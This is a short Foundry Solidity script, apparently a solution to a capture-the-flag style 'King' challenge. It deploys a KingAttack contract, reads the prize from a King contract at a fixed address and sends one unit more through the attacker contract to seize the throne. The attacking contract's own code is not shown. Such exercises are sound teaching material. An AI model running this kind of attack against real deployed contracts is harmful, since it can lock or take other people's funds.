// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";
import { console } from "forge-std/console.sol";

import { King } from "src/King/King.sol";
import { KingAttack } from "src/King/KingAttack.sol";
contract KingAttackScript is Script {
    function run() public {
        vm.startBroadcast();
            KingAttack kingAttacker = new KingAttack();
            uint currentPrize = getCurrentPrize();
            console.logString("CURRENT PRIZE:::");
            console.log(currentPrize);
            currentPrize++;
            kingAttacker.forwardFunds{value: currentPrize}(address(0x029A7E032a35506bA8Ae5aBbd24666d1B0aDd161));
        vm.stopBroadcast();
    }

    function getCurrentPrize() public view returns (uint) {
        return King(payable(address(0x029A7E032a35506bA8Ae5aBbd24666d1B0aDd161))).prize();
    }
}